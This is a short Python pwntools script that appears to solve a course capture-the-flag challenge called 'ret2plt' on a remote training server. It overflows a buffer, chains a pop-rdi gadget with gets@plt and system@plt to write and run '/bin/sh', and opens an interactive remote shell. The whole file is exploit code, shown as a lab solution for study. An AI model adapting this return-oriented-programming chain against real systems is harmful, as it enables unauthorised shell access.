from pwn import *

local = False
elf = 'ret2plt' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10174
    r = remote(ip,port)

context.arch = 'amd64'

raw_input("aaa")


pop_rdi = 0x400733

get_plt = 0x400530
sys_plt = 0x400520
write = 0x601000


rop = "a" * (0x30 + 8)
rop += p64(pop_rdi)
rop += p64(write)
rop += p64(get_plt)
rop += p64(pop_rdi)
rop += p64(write)
rop += p64(sys_plt)

print r.recvuntil(':D')
r.sendline(rop)
r.sendline("/bin/sh\0")
r.interactive()
